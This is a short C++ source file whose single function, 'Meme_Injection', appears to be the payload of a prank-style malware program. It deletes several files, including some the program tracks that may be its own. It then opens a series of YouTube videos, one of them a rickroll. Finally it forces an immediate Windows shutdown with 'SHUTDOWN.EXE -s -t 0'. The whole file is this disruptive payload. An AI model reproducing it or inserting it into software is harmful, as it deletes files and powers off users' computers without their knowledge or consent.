
/* (c) All Rights Reserved, Dashies Software Inc. */

extern bool Meme_Injection() {
	remove("C:\\ProgramData\\DC\\sif.dat");
	remove("TEMP.TMP");

	ShellExecute(NULL, TEXT("open"), TEXT("https://www.youtube.com/watch?v=v1PBptSDIh8#DashieWasNotHere"), NULL, NULL, SW_SHOW);
	Sleep(8000);

	ShellExecute(NULL, TEXT("open"), TEXT("https://www.youtube.com/watch?v=V0BbXpHhixU#DashieWasNotHere"), NULL, NULL, SW_SHOW);
	Sleep(8000);

	ShellExecute(NULL, TEXT("open"), TEXT("https://www.youtube.com/watch?v=dQw4w9WgXcQ#DashieWasNotHere"), NULL, NULL, SW_SHOW);
	Sleep(8000);

	ShellExecute(NULL, TEXT("open"), TEXT("https://www.youtube.com/watch?v=dQw4w9WgXcQ#DashieWasNotHere"), NULL, NULL, SW_SHOW);
	Sleep(32000);
	
	remove(DashCore.FileOne.c_str());
	remove(DashCore.FileTwo.c_str());
    remove(DashCore.FileThree.c_str());

	system(TEXT("C:\\WINDOWS\\SYSTEM32\\SHUTDOWN.EXE -s -t 0"));
}
